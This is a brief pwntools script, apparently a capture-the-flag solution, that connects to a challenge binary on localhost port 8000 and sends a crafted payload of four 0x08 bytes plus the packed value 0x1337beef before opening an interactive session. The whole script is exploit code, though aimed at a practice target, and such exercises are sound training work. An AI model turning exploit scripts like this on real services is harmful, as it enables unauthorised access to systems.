from pwn import *
elf = context.binary = ELF("chal")
p = remote("localhost", 8000)#process()
p.clean()
p.sendline(b"\x08"*4 + p32(0x1337beef))
p.interactive()